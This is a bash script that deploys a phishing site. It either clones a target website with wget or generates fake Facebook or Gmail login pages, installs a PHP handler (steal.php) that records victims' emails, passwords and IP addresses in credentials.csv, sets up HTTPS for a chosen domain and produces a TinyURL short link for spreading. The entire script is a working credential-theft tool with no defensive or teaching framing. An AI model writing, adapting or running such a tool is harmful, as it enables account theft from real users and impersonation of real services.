#!/bin/bash

set -e

REQUIRED_PKGS=("wget" "apache2" "php" "curl")
for pkg in "${REQUIRED_PKGS[@]}"; do
    if ! command -v "$pkg" &>/dev/null; then
        echo "[*] Installing $pkg..."
        sudo apt update && sudo apt install -y "$pkg"
    fi
done

WORKDIR="phishing_site"
rm -rf "$WORKDIR"
mkdir "$WORKDIR"

echo "Select phishing mode:"
echo "1) Clone a website (enter a URL)"
echo "2) Use a built-in template (Facebook or Gmail)"
read -p "Choice [1/2]: " mode

if [[ $mode == 1 ]]; then
    read -p "Enter target website URL (e.g., https://example.com): " TARGET_URL
    wget --mirror --convert-links --adjust-extension --page-requisites --no-parent "$TARGET_URL" -P "$WORKDIR"
    CLONED_INDEX=$(find "$WORKDIR" -type f -name "index.html" | head -n 1)
    if [[ ! -f "$CLONED_INDEX" ]]; then
        echo "ERROR: index.html not found after cloning. Exiting."
        exit 1
    fi
    CLONED_ROOT=$(dirname "$CLONED_INDEX")
    sudo rm -rf /var/www/html/*
    sudo cp -r "$CLONED_ROOT"/* /var/www/html/
    sudo cp "$CLONED_INDEX" /var/www/html/index.html
    sudo cp "$WORKDIR/steal.php" /var/www/html/steal.php 2>/dev/null || true
else
    echo "Select template:"
    echo "1) Facebook"
    echo "2) Gmail"
    read -p "Choice [1/2]: " template

    if [[ $template == 1 ]]; then
        TITLE="Facebook - Log In"
        ACTION="https://www.facebook.com"
        REDIRECT="https://www.facebook.com"
    elif [[ $template == 2 ]]; then
        TITLE="Gmail - Sign In"
        ACTION="https://accounts.google.com"
        REDIRECT="https://accounts.google.com"
    else
        echo "Invalid template selection."
        exit 1
    fi

    cat > "$WORKDIR/index.html" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>$TITLE</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin-top: 100px;}
        .phishbox { background: #fff; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.12); }
        .phishbox h2 { margin-bottom: 24px; }
        input[type="text"], input[type="password"] { padding: 12px; width: 260px; margin-bottom: 16px; border-radius: 4px; border: 1px solid #ccc; }
        button { background: #1877f2; color: #fff; border: none; padding: 12px 90px; border-radius: 4px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
<div class="phishbox">
    <h2>$TITLE</h2>
    <form action="steal.php" method="post">
      <input type="text" name="email" placeholder="Email" autocomplete="off" required><br>
      <input type="password" name="pass" placeholder="Password" autocomplete="off" required><br>
      <button type="submit">Sign In</button>
    </form>
</div>
</body>
</html>
EOF

    cat > "$WORKDIR/steal.php" <<EOF
<?php
date_default_timezone_set('UTC');
\$data = [
    "timestamp" => date("Y-m-d H:i:s"),
    "ip" => \$_SERVER['REMOTE_ADDR'],
    "user" => \$_POST['email'] ?? '',
    "pass" => \$_POST['pass'] ?? ''
];
\$file = __DIR__ . "/credentials.csv";
\$handle = fopen(\$file, "a");
fputcsv(\$handle, \$data);
fclose(\$handle);
header("Location: '$REDIRECT'");
exit();
?>
EOF

    sudo rm -rf /var/www/html/*
    sudo cp "$WORKDIR/index.html" /var/www/html/index.html
    sudo cp "$WORKDIR/steal.php" /var/www/html/steal.php
fi

read -p "Do you have a custom domain you want to use? (SSL will be configured) [y/n]: " sslchoice
if [[ "$sslchoice" == "y" || "$sslchoice" == "Y" ]]; then
    read -p "Enter your domain (already pointing to this server): " DOMAIN
    if ! command -v certbot &>/dev/null; then
        sudo apt update && sudo apt install -y certbot
    fi
    sudo certbot --apache -d "$DOMAIN" --non-interactive --agree-tos -m "admin@$DOMAIN"
    PROTOCOL="https"
    URL="$PROTOCOL://$DOMAIN"
else
    PROTOCOL="http"
    IP=$(hostname -I | awk '{print $1}')
    URL="$PROTOCOL://$IP"
fi

sudo systemctl restart apache2

SHORT_URL=$(curl -s "https://tinyurl.com/api-create.php?url=$URL")
echo "[*] Phishing page is live at: $URL"
echo "[*] Short URL: $SHORT_URL"
echo "[*] Credentials will be logged in /var/www/html/credentials.csv"
echo "[*] Apache has been configured. You can monitor with: sudo tail -f /var/log/apache2/access.log"
echo "[*] To stop, run: sudo systemctl stop apache2"
